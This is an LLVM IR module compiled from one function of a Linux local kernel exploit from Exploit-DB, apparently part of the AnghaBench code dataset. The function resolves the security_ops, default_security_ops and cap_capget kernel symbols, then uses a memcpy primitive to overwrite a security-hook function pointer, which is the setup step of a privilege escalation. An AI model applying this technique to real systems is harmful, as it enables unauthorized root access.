; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15344.c_prepare.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15344.c_prepare.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64 (i8*)*, i32 }

@.str = private unnamed_addr constant [25 x i8] c"Reticulating splines...\0A\00", align 1
@exp_state = common dso_local global %struct.TYPE_2__* null, align 8
@.str.1 = private unnamed_addr constant [13 x i8] c"security_ops\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"default_security_ops\00", align 1
@default_sec = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"cap_capget\00", align 1
@restore = common dso_local global i32 0, align 4
@target = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @prepare(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  %4 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %5 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %6 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %5, i32 0, i32 0
  %7 = load i64 (i8*)*, i64 (i8*)** %6, align 8
  %8 = call i64 %7(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i64 %8, i64* %3, align 8
  %9 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %10 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %9, i32 0, i32 0
  %11 = load i64 (i8*)*, i64 (i8*)** %10, align 8
  %12 = call i64 %11(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %13 = trunc i64 %12 to i32
  store i32 %13, i32* @default_sec, align 4
  %14 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %15 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %14, i32 0, i32 0
  %16 = load i64 (i8*)*, i64 (i8*)** %15, align 8
  %17 = call i64 %16(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* @restore, align 4
  %19 = load i64, i64* %3, align 8
  %20 = call i32 @super_memcpy(i64 %19, i32* @default_sec, i32 8)
  %21 = load i32, i32* @default_sec, align 4
  %22 = sext i32 %21 to i64
  %23 = add i64 %22, 16
  %24 = add i64 %23, 16
  store i64 %24, i64* @target, align 8
  %25 = load i64, i64* @target, align 8
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** @exp_state, align 8
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i32 0, i32 1
  %28 = call i32 @super_memcpy(i64 %25, i32* %27, i32 8)
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @super_memcpy(i64, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
